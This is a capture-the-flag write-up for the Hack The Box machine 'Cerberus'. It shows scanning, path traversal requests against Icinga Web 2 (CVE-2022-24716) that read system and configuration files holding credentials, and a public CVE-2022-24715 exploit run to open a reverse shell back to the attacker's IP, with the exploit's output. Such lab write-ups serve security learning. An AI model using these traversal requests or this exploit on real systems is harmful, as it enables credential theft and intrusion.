  ![image](https://user-images.githubusercontent.com/87700008/226189420-afa389ca-2fb9-4439-8223-14edf49a43f2.png)

https://app.hackthebox.com/machines/534

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration :

### Port scanning:

Started with a quick rustscan :

    sudo rustscan -a 10.10.11.205 -- -sC -sV -T4 -vv -oN cerberus_nmap
    
After scanning I found only 1 open port '8080'.

```
PORT     STATE SERVICE REASON         VERSION
8080/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2
```

In the port scan results I found a domain, running on port 8080 : "icinga.cerberus.local:8080". So I added the domain to /etc/hosts file.

Next I tried UDP scanning on the box to collect some for info & I found 3 more open ports : 53, 88, 123.

```
Nmap scan report for icinga.cerberus.local (10.10.11.205)
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2023-03-20 13:10:31 EDT for 19558s
Not shown: 997 open|filtered ports
Reason: 997 no-responses
PORT    STATE SERVICE      REASON               VERSION
53/udp  open  domain       udp-response ttl 127 (generic dns response: NOTIMP)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
88/udp  open  kerberos-sec udp-response         Microsoft Windows Kerberos (server time: 2023-03-20 17:25:46Z)
123/udp open  ntp          udp-response         NTP v3
| ntp-info: 
|_  receive time stamp: 2023-03-20T18:47:26
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.91%I=7%D=3/20%Time=6418970F%P=x86_64-unknown-linux-gnu%r
SF:(DNSStatusRequest,C,"\0\0\x90\x04\0\0\0\0\0\0\0\0")%r(NBTStat,32,"\x80\
SF:xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0\0!\
SF:0\x01");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 13s
```

### Sub-domain/directory enum:

After checking the results of port scanning I moved onto the sub directory enumeration & searched for any vulnerable sub directory/services but didn't found any as almost all of the services required authentication :

    gobuster dir -u http://icinga.cerberus.local:8080/icingaweb2 -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o cer_web -b 404,403 -k
    
![image](https://user-images.githubusercontent.com/87700008/226830002-a94919c5-1bc7-4abe-8486-8071708b35c4.png)

I then started checking the website & the services running on it. I checked what is Icinga & found that : "_Icinga is a monitoring system which checks the availability of your network resources, notifies users of outages, and generates performance data for reporting._"

![image](https://user-images.githubusercontent.com/87700008/226831317-9aea70a7-ea04-40ca-b1db-56a544a3cf79.png)

I tried for default credentials but that didn't worked, I checked HTML source code & found one JavaScript file in it but that is also not leaking any info.

Then I searched for the potential exploits available for Icinga & found this [blog](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web).
The blog explains Path Traversal vulnerability (CVE-2022-24716) that can be abused to disclose any file on the server. It can be exploited without authentication and without prior knowledge of a user account.

### Initial access:

I followed the blog & checked whether the website is vulnerable or not. So I used the below command with curl to check for response & received the response with hosts info :

    curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts
    
```
127.0.0.1 iceinga.cerberus.local iceinga
127.0.1.1 localhost
172.16.22.1 DC.cerberus.local DC cerberus.local

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

From the hosts results I observed the IP : "172.16.22.1" which is commonly associated with the docker container. So, it seems like the box is running the docker inside it, We can note that 172.16.22.1 is hosting the DC.

Then checked for the /etc/passwd file & found 1 user in it "matthew" :

![image](https://user-images.githubusercontent.com/87700008/226844706-2ec364eb-b0cc-4b81-ac16-869c49349beb.png)

Next I checked for the Icings web [documentation](https://icinga.com/docs/icinga-web/latest/) & checked for more configuration & authentication related files :

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/config.ini

[global]
show_stacktraces = "1"
show_application_state_messages = "1"
config_backend = "db"
config_resource = "icingaweb2"
module_path = "/usr/share/icingaweb2/modules/"

[logging]
log = "syslog"
level = "ERROR"
application = "icingaweb2"
facility = "user"

[themes]

[authentication]
```

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini

[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "[**********]"
use_ssl = "0"

[teset1]
type = "ssh"
user = "matthew"
private_key = "/etc/icingaweb2/ssh/matthew"
```

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/roles.ini

[Administrators]
users = "matthew"
permissions = "*"
groups = "Administrators"
unrestricted = "1"
```

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/authentication.ini

[icingaweb2]
backend = "db"
resource = "icingaweb2"
```

With the gathered credentials of matthew from the resources.ini, I logged into Icinga web portal :

![image](https://user-images.githubusercontent.com/87700008/226851350-7a63d379-7e88-4981-b988-43c0414f30be.png)

As of now I have logged into the website, I can check more info about it, which I wasn't able to do at the time port sub directory enumertaion. I checked for the /about section & found that the Icinga is running on web version 2.9.2 :

![image](https://user-images.githubusercontent.com/87700008/226852899-20d37e43-dd06-4a0a-b3b5-179062e7b19e.png)

Searching for the exploits I observed that the service version is vulnerable to [CVE-2022-24715](https://nvd.nist.gov/vuln/detail/CVE-2022-24715) which affects some unknown processing of the component SSH Resource File Handler & leads to the execution of arbitrary PHP code from the administration interface. 

The best pat is that "matthew" is part of the "Administrators" group which fulfills the need to exploit the vulnerability.

### RCE:

For the RCE I was searching for the exploit and found this [Github Repo](https://github.com/JacobEbben/CVE-2022-24715). Using the script exploit.py & following the process from this [blog](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web) I got the revershell :

```
python3 exploit.py -t http://icinga.cerberus.local:8080/icingaweb2/ -I 10.10.14.80 -P 53 -u matthew -p ****************** -e /home/kali/Downloads/HTB/cerberus/private_cerbereus -x http://127.0.0.1:8080/

[INFO] Attempting to login to the Icinga Web 2 instance...
[INFO] Attempting to upload our malicious module...
[SUCCESS] The payload appears to be uploaded successfully!
[INFO] Modifying configurations...
[INFO] Attempting to enable the malicious module...
[INFO] Trying to trigger payload! Have a listener ready!
[SUCCESS] It appears that a reverse shell was started!
[INFO] Removing malicious module file...
[ERROR] An error occurred while cleaning up modified configurations!
[ALERT] Manual removal of the exploit remnants is highly recommended!
HTTPConnectionPool(host='127.0.0.1', port=8080): Read timed out. (read timeout=2)
[ALERT] In the process of exploitation, the application logging has been turned off. Log in manually to reset these settings!
```

![image](https://user-images.githubusercontent.com/87700008/226912820-11952123-32c6-4115-8490-7bf5b72fd697.png)
